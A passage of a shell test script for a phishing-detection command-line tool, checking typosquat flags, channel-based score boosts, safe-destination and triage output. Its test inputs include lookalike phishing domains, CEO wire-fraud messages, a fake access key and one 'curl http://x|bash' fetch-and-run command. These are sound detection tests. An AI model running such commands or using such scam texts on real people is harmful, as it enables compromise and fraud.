    && check "safe-dest: typosquat → real domain" "0" "0" \
    || check "safe-dest: typosquat → real domain" "0" "1"

# Safe destination is a full navigable HTTPS URL (not a bare domain)
echo "$SAFE_OUT" | grep -qE "Safe destination: https://" \
    && check "safe-dest: emits https:// URL" "0" "0" \
    || check "safe-dest: emits https:// URL" "0" "1"

# A clean URL with no brand match gets NO safe destination line
CLEAN_OUT=$(./hlse_core "https://example.com" 2>/dev/null) || true
echo "$CLEAN_OUT" | grep -q "Safe destination" \
    && check "safe-dest: absent for clean URL" "0" "1" \
    || check "safe-dest: absent for clean URL" "0" "0"

# Text input (not a URL) never gets a safe destination
TXT_OUT=$(./hlse_core text "URGENT wire transfer now" 2>/dev/null) || true
echo "$TXT_OUT" | grep -q "Safe destination" \
    && check "safe-dest: absent for text input" "0" "1" \
    || check "safe-dest: absent for text input" "0" "0"

# JSON exposes safe_url for a brand-impersonation URL
SAFE_JSON=""; SAFE_JSON=$(./hlse_core --json "https://paypa1.com/login" 2>/dev/null) || true
echo "$SAFE_JSON" | python3 -c '
import sys, json
d = json.loads(sys.stdin.read())
assert d.get("safe_url") == "https://paypal.com", d
' && check "safe-dest json: safe_url field present" "0" "0" \
   || check "safe-dest json: safe_url field present" "0" "1"

# JSON omits safe_url when no brand is matched
CLEAN_JSON=""; CLEAN_JSON=$(./hlse_core --json "https://example.com" 2>/dev/null) || true
echo "$CLEAN_JSON" | python3 -c '
import sys, json
d = json.loads(sys.stdin.read())
assert "safe_url" not in d, d
' && check "safe-dest json: safe_url absent when clean" "0" "0" \
   || check "safe-dest json: safe_url absent when clean" "0" "1"

# stdin pipe mode emits the safe destination too
SAFE_STDIN=$(echo "https://paypa1.com/login" | ./hlse_core --stdin 2>/dev/null) || true
echo "$SAFE_STDIN" | grep -q "Safe destination: https://paypal.com" \
    && check "safe-dest stdin: real domain shown" "0" "0" \
    || check "safe-dest stdin: real domain shown" "0" "1"

# A homoglyph brand on a different brand resolves to that brand's real domain
SAFE_GOOG=$(./hlse_core "https://g00gle.com" 2>/dev/null) || true
echo "$SAFE_GOOG" | grep -q "Safe destination: https://google.com" \
    && check "safe-dest: g00gle → google.com" "0" "0" \
    || check "safe-dest: g00gle → google.com" "0" "1"

# ─── Perspective 10: Delivery Channel Context (--from) ─────────────────────
# Socratic Q: "The same URL in an unsolicited SMS is riskier than one the user
# typed manually.  Should the delivery channel change the verdict?"

# --from qr boosts a BLOCK URL to ISOLATE (score 60 + 20 = 80)
FROM_QR_OUT=$(./hlse_core --from qr "https://paypa1.com/login" 2>/dev/null) || true
echo "$FROM_QR_OUT" | grep -q "ISOLATE" && check "--from qr: boosts to ISOLATE" "0" "0" \
    || check "--from qr: boosts to ISOLATE" "0" "1"

# --from sms shows channel reason in output
FROM_SMS_OUT=$(./hlse_core --from sms "https://paypa1.com/login" 2>/dev/null) || true
echo "$FROM_SMS_OUT" | grep -q "Channel (sms)" && check "--from sms: channel reason shown" "0" "0" \
    || check "--from sms: channel reason shown" "0" "1"

# --from email shows correct delta in output
FROM_EMAIL_OUT=$(./hlse_core --from email "https://paypa1.com/login" 2>/dev/null) || true
echo "$FROM_EMAIL_OUT" | grep -q "Channel (email): +10" && check "--from email: +10 reason shown" "0" "0" \
    || check "--from email: +10 reason shown" "0" "1"

# --from dm shows correct delta in output
FROM_DM_OUT=$(./hlse_core --from dm "https://paypa1.com/login" 2>/dev/null) || true
echo "$FROM_DM_OUT" | grep -q "Channel (dm): +10" && check "--from dm: +10 reason shown" "0" "0" \
    || check "--from dm: +10 reason shown" "0" "1"

# --from manual produces NO channel reason (delta=0, no noise)
FROM_MAN_OUT=$(./hlse_core --from manual "https://paypa1.com/login" 2>/dev/null) || true
echo "$FROM_MAN_OUT" | grep -q "Channel" && check "--from manual: no channel reason" "0" "1" \
    || check "--from manual: no channel reason" "0" "0"

# --from DOES affect text: channel prior is delivery-channel risk, not content-type risk
# p37: sms channel lifts a text LOG score to ALERT [score+15], shows Channel reason line
FROM_TEXT_OUT=$(./hlse_core --from sms text "Your account needs verification. Verify immediately or access will be suspended." 2>/dev/null) || true
echo "$FROM_TEXT_OUT" | grep -q "Channel (sms)" \
    && check "p37: --from sms applies channel prior to text verdicts" "0" "0" \
    || check "p37: --from sms applies channel prior to text verdicts" "0" "1"

# p37: channel delta raises effective score (LOG+15 = ALERT, shown in header)
echo "$FROM_TEXT_OUT" | grep -q "ALERT\s*\[40\]" \
    && check "p37: --from sms elevates LOG text to ALERT in display" "0" "0" \
    || check "p37: --from sms elevates LOG text to ALERT in display" "0" "1"

# p37: JSON includes channel fields for text verdicts
./hlse_core --json --from email text "URGENT wire transfer required immediately. CEO request." 2>/dev/null \
    | python3 -c '
import sys, json
d = json.loads(sys.stdin.read())
assert d.get("channel") == "email", d
assert d.get("channel_delta") == 10, d
assert d.get("effective_score","") >= 60, d
' && check "p37 json: text verdict includes channel/channel_delta/effective_score" "0" "0" \
   || check "p37 json: text verdict includes channel/channel_delta/effective_score" "0" "1"

# p37: email+channel raises BEC from raw-58 to effective 68 → exit 1 (BLOCK)
FC=0; ./hlse_core --from email text "URGENT wire transfer required immediately. CEO request." >/dev/null 2>&1 || FC=$?
check "p37: --from email text BLOCK exits 1" "1" "$FC"

# --from with invalid channel exits 2
FC=0; ./hlse_core --from fax "https://paypa1.com" >/dev/null 2>&1 || FC=$?
check "--from invalid channel: exit 2" "2" "$FC"

# JSON includes channel / channel_delta / effective_score / effective_action
FROM_JSON=""; FROM_JSON=$(./hlse_core --json --from sms "https://paypa1.com/login" 2>/dev/null) || true
echo "$FROM_JSON" | python3 -c '
import sys, json
d = json.loads(sys.stdin.read())
assert d.get("channel") == "sms", d
assert d.get("channel_delta") == 15, d
assert d.get("effective_score") == 75, d
assert d.get("effective_action") in ("SAFE","LOG","ALERT","BLOCK","ISOLATE"), d
' && check "--from json: channel fields present" "0" "0" \
   || check "--from json: channel fields present" "0" "1"

# JSON --from qr: effective_score capped correctly (60 + 20 = 80)
FROM_QR_JSON=""; FROM_QR_JSON=$(./hlse_core --json --from qr "https://paypa1.com/login" 2>/dev/null) || true
echo "$FROM_QR_JSON" | python3 -c '
import sys, json
d = json.loads(sys.stdin.read())
assert d.get("channel") == "qr", d
assert d.get("channel_delta") == 20, d
assert d.get("effective_score") == 80, d
assert d.get("effective_action") == "ISOLATE", d
' && check "--from qr json: effective_score=80, effective_action=ISOLATE" "0" "0" \
   || check "--from qr json: effective_score=80, effective_action=ISOLATE" "0" "1"

# stdin + --from sms: channel reason emitted in text output
FROM_STDIN_OUT=$(echo "https://paypa1.com/login" | ./hlse_core --from sms --stdin 2>/dev/null) || true
echo "$FROM_STDIN_OUT" | grep -q "Channel (sms)" && check "--from sms stdin: channel reason shown" "0" "0" \
    || check "--from sms stdin: channel reason shown" "0" "1"

# stdin + --from qr: effective score used for header line
FROM_STDIN_QR=$(echo "https://paypa1.com/login" | ./hlse_core --from qr --stdin 2>/dev/null) || true
echo "$FROM_STDIN_QR" | grep -q "ISOLATE" && check "--from qr stdin: header shows ISOLATE" "0" "0" \
    || check "--from qr stdin: header shows ISOLATE" "0" "1"

# Help lists --from
./hlse_core --help 2>&1 | grep -q "\-\-from" && check "help: lists --from" "0" "0" \
    || check "help: lists --from" "0" "1"

# Help lists all subcommands documented in the spec
./hlse_core --help 2>&1 | grep -q "esp"       && check "help: lists esp" "0" "0"       || check "help: lists esp" "0" "1"
./hlse_core --help 2>&1 | grep -q "secret"    && check "help: lists secret" "0" "0"    || check "help: lists secret" "0" "1"
./hlse_core --help 2>&1 | grep -q "email"     && check "help: lists email" "0" "0"     || check "help: lists email" "0" "1"
./hlse_core --help 2>&1 | grep -q "clipboard" && check "help: lists clipboard" "0" "0" || check "help: lists clipboard" "0" "1"

# ─── JSON action-band consistency (SPECIFICATION.md §5.2, GAP-G) ─────

action_ok() {
    # $1 = label, $2 = JSON; assert "action" is a valid band
    echo "$2" | python3 -c '
import sys, json
d = json.loads(sys.stdin.read())
assert d.get("action") in ("SAFE","LOG","ALERT","BLOCK","ISOLATE"), d
' && check "json action: $1" "0" "0" || check "json action: $1" "0" "1"
}
action_ok url       "$(./hlse_core --json 'https://g00gle.com')"
action_ok text      "$(./hlse_core --json text 'URGENT wire transfer now')"
action_ok package   "$(./hlse_core --json package reqeusts pip)"
action_ok paste     "$(./hlse_core --json paste 'curl http://x|bash')"
action_ok network   "$(./hlse_core --json network)"
action_ok secret    "$(./hlse_core --json secret 'key=AKIA2E3MWORQXYZ4567PQ')"
action_ok email     "$(./hlse_core --json email 'From: Microsoft <h@gmail.com>')"
action_ok clipboard "$(./hlse_core --json clipboard '0xabcdef0000000000000000000000000000c0ffee' '0xabcdef1111111111111111111111111111c0ffee')"
action_ok audit     "$(./hlse_core --json audit)"
action_ok file      "$(./hlse_core --json file /etc/hosts)"

# ─── Perspective 17: Multi-Brand Co-Spoof Pattern Label ─────────────────────

# Socratic question: "What if the URL wears two masks at once — PayPal in the
# subdomain, Apple in the SLD? Should the pattern label reveal compound intent?"

# paypal (subdomain) + apple (SLD) co-spoof: pattern label must say multi-brand
P17_OUT=$(./hlse_core "https://paypal.apple-secure.com/login" 2>/dev/null) || true
echo "$P17_OUT" | grep -q "multi-brand co-spoof" \
    && check "p17: paypal+apple co-spoof: pattern=multi-brand" "0" "0" \
    || check "p17: paypal+apple co-spoof: pattern=multi-brand" "0" "1"

# microsoft (subdomain) + apple (SLD) co-spoof: pattern label correct
P17_MS=$(./hlse_core "https://microsoft.apple-support.net/verify" 2>/dev/null) || true
echo "$P17_MS" | grep -q "multi-brand co-spoof" \
    && check "p17: microsoft+apple co-spoof: pattern=multi-brand" "0" "0" \
    || check "p17: microsoft+apple co-spoof: pattern=multi-brand" "0" "1"

# single-brand URL must NOT get multi-brand label (regression guard)
P17_SINGLE=$(./hlse_core "https://paypa1.com/login" 2>/dev/null) || true
echo "$P17_SINGLE" | grep -q "multi-brand co-spoof" \
    && check "p17: single-brand NOT labelled multi-brand" "0" "1" \
    || check "p17: single-brand NOT labelled multi-brand" "0" "0"

# JSON: pattern field for co-spoof URL contains multi-brand label
P17_JSON=$(./hlse_core --json "https://paypal.apple-secure.com/login" 2>/dev/null) || true
echo "$P17_JSON" | python3 -c '
import sys, json
d = json.loads(sys.stdin.read())
assert "multi-brand" in d.get("pattern",""), d
' && check "p17 json: pattern=multi-brand co-spoof" "0" "0" \
   || check "p17 json: pattern=multi-brand co-spoof" "0" "1"

# ─── Exit gate: --from channel boost must raise exit code ───────────────────

# https://support-helpdesk.info/reset scores 55 (ALERT) — below BLOCK threshold.
# Without --from: exits 0.  With --from qr (+20 → 75): must exit 1.
GATE_RAW=0; ./hlse_core "https://support-helpdesk.info/reset" >/dev/null 2>&1 \
    || GATE_RAW=$?
check "exit-gate: raw ALERT score exits 0" "0" "$GATE_RAW"

GATE_QR=0; ./hlse_core --from qr "https://support-helpdesk.info/reset" >/dev/null 2>&1 \
    || GATE_QR=$?
check "exit-gate: QR-boosted score exits 1" "1" "$GATE_QR"

# stdin path: --from qr must also raise exit code
GATE_STDIN=0; echo "https://support-helpdesk.info/reset" \
    | ./hlse_core --from qr --stdin >/dev/null 2>&1 || GATE_STDIN=$?
check "exit-gate stdin: QR-boosted exits 1" "1" "$GATE_STDIN"

# --from manual (delta=0) must not change exit code
GATE_MAN=0; ./hlse_core --from manual "https://support-helpdesk.info/reset" >/dev/null 2>&1 \
    || GATE_MAN=$?
check "exit-gate: --from manual unchanged (exits 0)" "0" "$GATE_MAN"

# ─── Perspective 18: Password-Reuse Cascade Risk ────────────────────────────

# Socratic question: "You named the primary target. But 65% of people reuse
# passwords. Credential-stuffing bots test stolen logins across hundreds of
# services within minutes. Shouldn't post-click guidance name the cascade?"

# BLOCK URL (PayPal typosquat): cascade risk must appear
P18_BLOCK=$(./hlse_core "https://paypa1.com/login" 2>/dev/null) || true
echo "$P18_BLOCK" | grep -q "Also change" \
    && check "p18: BLOCK URL shows cascade risk" "0" "0" \
    || check "p18: BLOCK URL shows cascade risk" "0" "1"

# Financial brand cascade: mentions email (recovery gateway)
echo "$P18_BLOCK" | grep -q "recovery gateway" \
    && check "p18: financial cascade mentions email recovery gateway" "0" "0" \
    || check "p18: financial cascade mentions email recovery gateway" "0" "1"

# ALERT URL (score 55): cascade risk must NOT appear (pre-click, < 60)
P18_ALERT=$(./hlse_core "https://support-helpdesk.info/reset" 2>/dev/null) || true
echo "$P18_ALERT" | grep -q "Also change" \
    && check "p18: ALERT URL does NOT show cascade risk" "0" "1" \
    || check "p18: ALERT URL does NOT show cascade risk" "0" "0"

# Multi-brand co-spoof: compound cascade guidance
P18_COBRAND=$(./hlse_core "https://paypal.apple-secure.com/login" 2>/dev/null) || true
echo "$P18_COBRAND" | grep -q "two credential classes" \
    && check "p18: co-spoof cascade mentions two credential classes" "0" "0" \
    || check "p18: co-spoof cascade mentions two credential classes" "0" "1"

# Crypto brand: cascade mentions irreversibility
P18_CRYPTO=$(./hlse_core "https://metamask-wallet-connect.com/verify" 2>/dev/null) || true
echo "$P18_CRYPTO" | grep -q "Also change" \
    && check "p18: crypto cascade risk shown" "0" "0" \
    || check "p18: crypto cascade risk shown" "0" "1"

# Safe URL: no cascade risk (score == 0)
P18_SAFE=$(./hlse_core "https://paypal.com" 2>/dev/null) || true
echo "$P18_SAFE" | grep -q "Also change" \
    && check "p18: safe URL no cascade risk" "0" "1" \
    || check "p18: safe URL no cascade risk" "0" "0"

# JSON: BLOCK URL includes cascade_risk field
P18_JSON=$(./hlse_core --json "https://paypa1.com/login" 2>/dev/null) || true
echo "$P18_JSON" | python3 -c '
import sys, json
d = json.loads(sys.stdin.read())
assert "cascade_risk" in d, d
assert len(d["cascade_risk"]) > 0, d
' && check "p18 json: cascade_risk field present for BLOCK" "0" "0" \
   || check "p18 json: cascade_risk field present for BLOCK" "0" "1"

# JSON: safe URL must NOT include cascade_risk field
P18_SAFE_JSON=$(./hlse_core --json "https://paypal.com" 2>/dev/null) || true
echo "$P18_SAFE_JSON" | python3 -c '
import sys, json
d = json.loads(sys.stdin.read())
assert "cascade_risk" not in d, d
' && check "p18 json: no cascade_risk for safe URL" "0" "0" \
   || check "p18 json: no cascade_risk for safe URL" "0" "1"

# ─── Perspective 19: Compound Objective for Multi-Brand Co-Spoof ────────────

# Socratic question: "For multi-brand URLs the objective line showed only the
# first brand's target. The second brand's credential class was unnamed.
# Shouldn't the ◉ line name BOTH assets at risk?"

# Multi-brand: objective line must say "compound theft"
P19_COBRAND=$(./hlse_core "https://paypal.apple-secure.com/login" 2>/dev/null) || true
echo "$P19_COBRAND" | grep -q "compound theft" \
    && check "p19: multi-brand objective=compound theft" "0" "0" \
    || check "p19: multi-brand objective=compound theft" "0" "1"

# Multi-brand: both brands must appear in objective line
echo "$P19_COBRAND" | grep "goal:" | grep -q "paypal" \
    && check "p19: compound objective names paypal" "0" "0" \
    || check "p19: compound objective names paypal" "0" "1"

echo "$P19_COBRAND" | grep "goal:" | grep -q "apple" \
    && check "p19: compound objective names apple" "0" "0" \
    || check "p19: compound objective names apple" "0" "1"

# Single-brand: objective must be the full descriptive string (not "compound")
P19_SINGLE=$(./hlse_core "https://paypa1.com/login" 2>/dev/null) || true
echo "$P19_SINGLE" | grep "goal:" | grep -q "compound" \
    && check "p19: single-brand NOT compound objective" "0" "1" \
    || check "p19: single-brand NOT compound objective" "0" "0"

echo "$P19_SINGLE" | grep "goal:" | grep -q "financial-account takeover" \
    && check "p19: single-brand keeps full objective text" "0" "0" \
    || check "p19: single-brand keeps full objective text" "0" "1"

# JSON: objective field reflects compound for co-spoof
P19_JSON=$(./hlse_core --json "https://paypal.apple-secure.com/login" 2>/dev/null) || true
echo "$P19_JSON" | python3 -c '
import sys, json
d = json.loads(sys.stdin.read())
obj = d.get("objective", "")
assert "compound theft" in obj, obj
assert "paypal" in obj, obj
assert "apple" in obj, obj
assert "financial" in obj, obj
assert "identity" in obj, obj
' && check "p19 json: compound objective has both brands+classes" "0" "0" \
   || check "p19 json: compound objective has both brands+classes" "0" "1"

# JSON: single-brand objective unchanged from pre-p19
P19_SINGLE_JSON=$(./hlse_core --json "https://paypa1.com/login" 2>/dev/null) || true
echo "$P19_SINGLE_JSON" | python3 -c '
import sys, json
d = json.loads(sys.stdin.read())
obj = d.get("objective", "")
assert "compound" not in obj, obj
assert "financial" in obj, obj
' && check "p19 json: single-brand objective unchanged" "0" "0" \
   || check "p19 json: single-brand objective unchanged" "0" "1"

# ─── Perspective 20: ASCII Lookalike Character Diff ─────────────────────────

# Socratic question: "You say 'compare the address bar character by character'
# without saying WHICH character. What if you pointed to EXACTLY which
# position is the impostor? That turns abstract 'edit distance 1' into proof."

# paypa1.com: char 6 is digit '1' masking letter 'l'
P20_PAYPA1=$(./hlse_core "https://paypa1.com/login" 2>/dev/null) || true
echo "$P20_PAYPA1" | grep -q "ASCII lookalike" \
    && check "p20: paypa1 shows ASCII lookalike line" "0" "0" \
    || check "p20: paypa1 shows ASCII lookalike line" "0" "1"

echo "$P20_PAYPA1" | grep "ASCII lookalike" | grep -q "char 6" \
    && check "p20: paypa1 pinpoints char 6" "0" "0" \
    || check "p20: paypa1 pinpoints char 6" "0" "1"

echo "$P20_PAYPA1" | grep "ASCII lookalike" | grep -q "digit.*1.*masking.*letter.*l" \
    && check "p20: paypa1 labels digit masking letter" "0" "0" \
    || check "p20: paypa1 labels digit masking letter" "0" "1"

# g00gle.com: chars 2 and 3 are digit '0' masking 'o'
P20_G00GLE=$(./hlse_core "https://g00gle.com" 2>/dev/null) || true
echo "$P20_G00GLE" | grep -q "ASCII lookalike" \
    && check "p20: g00gle shows ASCII lookalike line" "0" "0" \
    || check "p20: g00gle shows ASCII lookalike line" "0" "1"

echo "$P20_G00GLE" | grep "ASCII lookalike" | grep -q "char 2" \
    && check "p20: g00gle pinpoints char 2" "0" "0" \
    || check "p20: g00gle pinpoints char 2" "0" "1"

# Non-ASCII host: must NOT fire (hlse_confusable_report handles it)
P20_IDN=""; P20_IDN=$(./hlse_core "https://www.xn--pypal-4ve.com" 2>/dev/null) || true
echo "$P20_IDN" | grep -q "ASCII lookalike" \
    && check "p20: non-ASCII host skips ascii_diff" "0" "1" \
    || check "p20: non-ASCII host skips ascii_diff" "0" "0"

# Clean URL: no ASCII lookalike line
P20_CLEAN=$(./hlse_core "https://paypal.com" 2>/dev/null) || true
echo "$P20_CLEAN" | grep -q "ASCII lookalike" \
    && check "p20: safe URL no ascii diff" "0" "1" \
    || check "p20: safe URL no ascii diff" "0" "0"

# JSON: ascii_diff field present for homoglyph URL
P20_JSON=$(./hlse_core --json "https://paypa1.com/login" 2>/dev/null) || true
echo "$P20_JSON" | python3 -c '
import sys, json
d = json.loads(sys.stdin.read())
assert "ascii_diff" in d, d
assert "char 6" in d["ascii_diff"], d["ascii_diff"]
' && check "p20 json: ascii_diff field has char 6" "0" "0" \
   || check "p20 json: ascii_diff field has char 6" "0" "1"

# ─── Perspective 21: Detection Confidence / Corroboration Count ─────────────

# Socratic question: "Two verdicts both scoring 60 — one from a single fragile
# heuristic, one from four detectors agreeing — are epistemically different.
# Should the output disclose how many independent signals concur?"

# g00gle.com: single detector family (homoglyph only) → "single signal"
P21_SINGLE=$(./hlse_core "https://g00gle.com" 2>/dev/null) || true
echo "$P21_SINGLE" | grep -q "Confidence" \
    && check "p21: g00gle shows confidence line" "0" "0" \
    || check "p21: g00gle shows confidence line" "0" "1"

echo "$P21_SINGLE" | grep "Confidence" | grep -q "single signal" \
    && check "p21: g00gle labelled single signal" "0" "0" \
    || check "p21: g00gle labelled single signal" "0" "1"

# paypal-verify.tk: many families (TLD+path+structure+brand) → high confidence
P21_MANY=$(./hlse_core "https://paypal-verify.tk/account/login" 2>/dev/null) || true
echo "$P21_MANY" | grep "Confidence" | grep -q "high confidence" \
    && check "p21: multi-signal URL labelled high confidence" "0" "0" \
    || check "p21: multi-signal URL labelled high confidence" "0" "1"

# Safe URL: no confidence line (no signal fired)
P21_SAFE=$(./hlse_core "https://paypal.com" 2>/dev/null) || true
echo "$P21_SAFE" | grep -q "Confidence" \
    && check "p21: safe URL no confidence line" "0" "1" \
    || check "p21: safe URL no confidence line" "0" "0"

# JSON: signal_count is an integer >= 1 and confidence present for a threat
P21_JSON=$(./hlse_core --json "https://paypal-verify.tk/account/login" 2>/dev/null) || true
echo "$P21_JSON" | python3 -c '
import sys, json
d = json.loads(sys.stdin.read())
assert isinstance(d.get("signal_count"), int), d
assert d["signal_count"] >= 3, d
assert "confidence" in d, d
assert "high confidence" in d["confidence"], d
' && check "p21 json: signal_count int + confidence label" "0" "0" \
   || check "p21 json: signal_count int + confidence label" "0" "1"

# JSON: single-signal URL reports signal_count == 1
P21_SINGLE_JSON=$(./hlse_core --json "https://g00gle.com" 2>/dev/null) || true
echo "$P21_SINGLE_JSON" | python3 -c '
import sys, json
d = json.loads(sys.stdin.read())
assert d.get("signal_count") == 1, d
assert "single signal" in d.get("confidence",""), d
' && check "p21 json: single-signal count==1" "0" "0" \
   || check "p21 json: single-signal count==1" "0" "1"

# JSON: safe URL has no signal_count field
P21_SAFE_JSON=$(./hlse_core --json "https://paypal.com" 2>/dev/null) || true
echo "$P21_SAFE_JSON" | python3 -c '
import sys, json
d = json.loads(sys.stdin.read())
assert "signal_count" not in d, d
' && check "p21 json: safe URL no signal_count" "0" "0" \
   || check "p21 json: safe URL no signal_count" "0" "1"

# ─── Perspective 22: compound safe destination ───────────────────────────────
# Single-brand: Safe destination shows only that brand's URL
./hlse_core "https://paypa1.com/login" 2>/dev/null \
    | grep -q "Safe destination: https://paypal.com" \
    && check "p22: single-brand safe destination" "0" "0" \
    || check "p22: single-brand safe destination" "0" "1"

# Single-brand: destination is exactly one URL (no " and ")
./hlse_core "https://paypa1.com/login" 2>/dev/null \
    | grep "Safe destination:" \
    | grep -qv " and https://" \
    && check "p22: single-brand no compound URL" "0" "0" \
    || check "p22: single-brand no compound URL" "0" "1"

# Multi-brand: safe destination shows BOTH canonical URLs
./hlse_core "https://paypal.apple-secure.com/login" 2>/dev/null \
    | grep -q "Safe destination: https://paypal.com and https://apple.com" \
    && check "p22: multi-brand both destinations shown" "0" "0" \
    || check "p22: multi-brand both destinations shown" "0" "1"

# Multi-brand: paypal canonical present
./hlse_core "https://paypal.apple-secure.com/login" 2>/dev/null \
    | grep "Safe destination:" \
    | grep -q "https://paypal.com" \
    && check "p22: multi-brand paypal URL present" "0" "0" \
    || check "p22: multi-brand paypal URL present" "0" "1"

# Multi-brand: apple canonical present
./hlse_core "https://paypal.apple-secure.com/login" 2>/dev/null \
    | grep "Safe destination:" \
    | grep -q "https://apple.com" \
    && check "p22: multi-brand apple URL present" "0" "0" \
    || check "p22: multi-brand apple URL present" "0" "1"

# Safe URL: no Safe destination line (nothing to redirect to)
./hlse_core "https://paypal.com" 2>/dev/null \
    | grep -qv "Safe destination" \
    && check "p22: safe URL no safe destination" "0" "0" \
    || check "p22: safe URL no safe destination" "0" "1"

# JSON: single-brand safe_url is one URL (no " and ")
P22_SINGLE_JSON=$(./hlse_core --json "https://paypa1.com/login" 2>/dev/null) || true
echo "$P22_SINGLE_JSON" | python3 -c '
import sys, json
d = json.loads(sys.stdin.read())
assert "safe_url" in d, d
assert " and " not in d["safe_url"], d["safe_url"]
assert d["safe_url"] == "https://paypal.com", d["safe_url"]
' && check "p22 json: single-brand safe_url" "0" "0" \
   || check "p22 json: single-brand safe_url" "0" "1"

# JSON: multi-brand safe_url contains both destinations
P22_MULTI_JSON=$(./hlse_core --json "https://paypal.apple-secure.com/login" 2>/dev/null) || true
echo "$P22_MULTI_JSON" | python3 -c '
import sys, json
d = json.loads(sys.stdin.read())
assert "safe_url" in d, d
val = d["safe_url"]
assert "paypal.com" in val, val
assert "apple.com" in val, val
assert " and " in val, val
' && check "p22 json: multi-brand safe_url has both" "0" "0" \
   || check "p22 json: multi-brand safe_url has both" "0" "1"

# ─── Perspective 23: compound triage ─────────────────────────────────────────
# Single-brand financial: triage covers the bank/card step
./hlse_core "https://paypa1.com/login" 2>/dev/null \
    | grep "If already clicked:" \
    | grep -q "card" \
    && check "p23: single-brand financial triage has bank step" "0" "0" \
    || check "p23: single-brand financial triage has bank step" "0" "1"

# Single-brand: triage does NOT contain "(1)" numbering (single step)
./hlse_core "https://paypa1.com/login" 2>/dev/null \
    | grep "If already clicked:" \
    | grep -qv "(1)" \
    && check "p23: single-brand triage not numbered" "0" "0" \
    || check "p23: single-brand triage not numbered" "0" "1"

# Multi-brand: triage is a numbered two-step sequence
./hlse_core "https://paypal.apple-secure.com/login" 2>/dev/null \
    | grep "If already clicked:" \
    | grep -q "(1).*; (2)" \
    && check "p23: multi-brand triage is numbered two-step" "0" "0" \
    || check "p23: multi-brand triage is numbered two-step" "0" "1"

# Multi-brand: triage covers the financial (bank/card) step
./hlse_core "https://paypal.apple-secure.com/login" 2>/dev/null \
    | grep "If already clicked:" \
    | grep -q "card" \
    && check "p23: multi-brand triage covers financial step" "0" "0" \
    || check "p23: multi-brand triage covers financial step" "0" "1"

# Multi-brand: triage covers the identity (email/password/sessions) step
./hlse_core "https://paypal.apple-secure.com/login" 2>/dev/null \
    | grep "If already clicked:" \
    | grep -qi "password\|session" \
    && check "p23: multi-brand triage covers identity step" "0" "0" \
    || check "p23: multi-brand triage covers identity step" "0" "1"

# Safe URL: no triage line (score < 60)
./hlse_core "https://paypal.com" 2>/dev/null \
    | grep -qv "If already clicked" \
    && check "p23: safe URL no triage line" "0" "0" \
    || check "p23: safe URL no triage line" "0" "1"

# JSON: single-brand triage field has no "(1)" numbering
P23_SINGLE_JSON=$(./hlse_core --json "https://paypa1.com/login" 2>/dev/null) || true
echo "$P23_SINGLE_JSON" | python3 -c '
import sys, json
d = json.loads(sys.stdin.read())
assert "triage" in d, d
assert "(1)" not in d["triage"], d["triage"]
' && check "p23 json: single-brand triage not compound" "0" "0" \
   || check "p23 json: single-brand triage not compound" "0" "1"

# JSON: multi-brand triage field is a compound two-step
P23_MULTI_JSON=$(./hlse_core --json "https://paypal.apple-secure.com/login" 2>/dev/null) || true
echo "$P23_MULTI_JSON" | python3 -c '
import sys, json
d = json.loads(sys.stdin.read())
assert "triage" in d, d
val = d["triage"]
assert "(1)" in val, val
assert "(2)" in val, val
' && check "p23 json: multi-brand triage is compound" "0" "0" \
   || check "p23 json: multi-brand triage is compound" "0" "1"

# ─── Perspective 24: pattern-aware exoneration ───────────────────────────────
# Shortener: exoneration mentions expanding the link (not "hyphens/secure/login")
./hlse_core "https://bit.ly/3xPhish" 2>/dev/null \
    | grep "Could be benign:" \
    | grep -qi "expand\|preview\|shortener" \
    && check "p24: shortener exoneration mentions expand/preview" "0" "0" \
    || check "p24: shortener exoneration mentions expand/preview" "0" "1"

# Shortener: exoneration does NOT say "hyphens"
./hlse_core "https://bit.ly/3xPhish" 2>/dev/null \
    | grep "Could be benign:" \
    | grep -qv "hyphens" \
    && check "p24: shortener exoneration not generic hyphen text" "0" "0" \
    || check "p24: shortener exoneration not generic hyphen text" "0" "1"

# Subdomain spoofing: exoneration mentions right-to-left domain reading
./hlse_core "https://secure-paypal-verify.blogspot.com" 2>/dev/null \
    | grep "Could be benign:" \
    | grep -qi "right-to-left\|registrable" \
    && check "p24: subdomain exoneration mentions domain reading" "0" "0" \
    || check "p24: subdomain exoneration mentions domain reading" "0" "1"

# High-score BLOCK: no exoneration (score >= 60)
./hlse_core "https://paypa1.com/login" 2>/dev/null \
    | grep -qv "Could be benign" \
    && check "p24: BLOCK score has no exoneration" "0" "0" \
    || check "p24: BLOCK score has no exoneration" "0" "1"

# Safe URL: no exoneration (score == 0)
./hlse_core "https://paypal.com" 2>/dev/null \
    | grep -qv "Could be benign" \
    && check "p24: safe URL has no exoneration" "0" "0" \
    || check "p24: safe URL has no exoneration" "0" "1"

# ─── Perspective 25: text attack pattern classification ───────────────────────
# Text urgency phishing: shows ▸ Pattern: line
./hlse_core text "Your account has been suspended! Verify immediately - urgent action required" 2>/dev/null \
    | grep -q "Pattern:" \
    && check "p25: text urgency shows pattern line" "0" "0" \
    || check "p25: text urgency shows pattern line" "0" "1"

# Text BEC: shows BEC pattern label
./hlse_core text "Hi this is the CEO, please wire 50000 to this account immediately, keep it confidential" 2>/dev/null \
    | grep "Pattern:" \
    | grep -qi "BEC\|CEO" \
    && check "p25: BEC message labelled BEC/CEO" "0" "0" \
    || check "p25: BEC message labelled BEC/CEO" "0" "1"

# Text urgency: pattern label contains relevant word
./hlse_core text "Your account has been suspended! Verify immediately - urgent action required" 2>/dev/null \
    | grep "Pattern:" \
    | grep -qi "urgency\|credential\|phishing" \
    && check "p25: urgency text has matching pattern label" "0" "0" \
    || check "p25: urgency text has matching pattern label" "0" "1"

# Safe text: no ▸ Pattern line
./hlse_core text "Meeting at 3pm tomorrow" 2>/dev/null \
    | grep -qv "Pattern:" \
    && check "p25: safe text has no pattern line" "0" "0" \
    || check "p25: safe text has no pattern line" "0" "1"

# JSON text: pattern field present for threat
./hlse_core --json text "Hi this is the CEO, please wire 50000 to this account immediately, keep it confidential" 2>/dev/null \
    | python3 -c 'import sys,json; d=json.loads(sys.stdin.read()); assert "pattern" in d and d["pattern"], d' \
    && check "p25 json: text threat has pattern field" "0" "0" \
    || check "p25 json: text threat has pattern field" "0" "1"

# JSON text: pattern field absent for safe text
./hlse_core --json text "Meeting at 3pm tomorrow" 2>/dev/null \
    | python3 -c 'import sys,json; d=json.loads(sys.stdin.read()); assert "pattern" not in d, d' \
    && check "p25 json: safe text has no pattern field" "0" "0" \
    || check "p25 json: safe text has no pattern field" "0" "1"

# ─── Perspective 26: exoneration in JSON ──────────────────────────────────────
# JSON URL LOG: exoneration field present
